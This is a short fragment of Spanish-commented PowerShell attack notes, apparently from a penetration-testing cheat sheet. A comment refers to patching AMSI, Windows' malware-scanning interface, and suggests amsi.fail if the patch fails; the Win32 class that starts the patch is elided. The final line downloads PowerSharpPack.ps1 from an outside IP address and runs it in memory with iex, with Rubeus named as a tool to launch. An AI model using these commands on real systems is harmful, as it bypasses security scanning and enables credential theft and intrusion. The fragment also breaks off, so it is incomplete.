...
## Luego el patch, amsi.fail puede ayudar si el codigo abajo no funciona
$Win32 = @"
using System;
using System.Runtime.InteropServices;
public class Win32 {
...
#Descargar el ps1 y ejecutarlo con los comandos que se desea ej: Rubeus
iex(new-object net.webclient).downloadstring('http://10.10.15.231:8000/PowerSharpPack.ps1')
